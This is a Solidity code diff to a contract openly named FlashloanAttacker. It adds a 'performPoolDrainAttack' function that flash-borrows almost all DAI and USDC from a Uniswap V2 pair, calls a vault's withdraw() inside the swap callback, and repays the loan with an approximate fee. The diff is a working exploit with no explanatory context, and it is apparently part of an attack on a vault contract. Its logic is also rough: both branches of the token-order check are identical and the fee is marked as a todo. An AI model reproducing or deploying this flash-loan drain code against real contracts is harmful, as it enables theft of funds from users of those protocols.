@@ -9,6 +9,8 @@ contract FlashloanAttacker {
     using SafeERC20 for IERC20;
 
     IVault public vault;
+    
+    event Debug(uint256 value);
 
     IERC20 public constant dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
     IERC20 public constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
@@ -36,7 +38,7 @@ contract FlashloanAttacker {
         uint256[] memory amounts = router.getAmountsOut(daiIn, path);
         uint256 usdcOut = amounts[1];
 
-        bytes memory data = abi.encode(daiIn);
+        bytes memory data = abi.encode(daiIn, 0);
 
         // Call swap to receive USDC from Pair
         address token0 = pair.token0();
@@ -44,6 +46,21 @@ contract FlashloanAttacker {
             pair.swap(0, usdcOut, address(this), data);
         } else {
             pair.swap(usdcOut, 0, address(this), data);
+        }
+    }
+
+    function performPoolDrainAttack() public {
+        uint256 daiAmount = dai.balanceOf(address(pair)) - 100;     // leave dust amount
+        uint256 usdcAmount = usdc.balanceOf(address(pair)) - 100;   // leave dust amount
+
+        bytes memory data = abi.encode(daiAmount * 1005 / 1000, usdcAmount * 1005 / 1000);  // Add extra fees as well ; todo: fix this to be exact amount
+
+        // Call swap to receive USDC from Pair
+        address token0 = pair.token0();
+        if (token0 == address(dai)) {
+            pair.swap(daiAmount, usdcAmount, address(this), data);
+        } else {
+            pair.swap(daiAmount, usdcAmount, address(this), data);
         }
     }
 
@@ -58,7 +75,8 @@ contract FlashloanAttacker {
         assert(msg.sender == address(pair)); // ensure that msg.sender is a V2 pair
 
         // Withdraw all from vault
-        vault.withdraw();
+        uint256 value = vault.withdraw();
+        emit Debug(value);
 
         // At the end of uniswapV2Call, contracts must return enough tokens to the pair to make it whole.
         // Specifically, this means that the product of the pair reserves after the swap, discounting all token amounts
@@ -69,7 +87,8 @@ contract FlashloanAttacker {
         // pricing function should be used to calculate e.g., the amount of WETH that must be returned in exchange for the amount
         // of DAI that was requested out.
 
-        uint256 daiIn = abi.decode(data, (uint256));
-        dai.transfer(msg.sender, daiIn);
+        (uint256 daiAmount, uint256 usdcAmount) = abi.decode(data, (uint256, uint256));
+        if (daiAmount > 0)  dai.transfer(msg.sender, daiAmount);
+        if (usdcAmount > 0) usdc.transfer(msg.sender, usdcAmount);
     }
 }
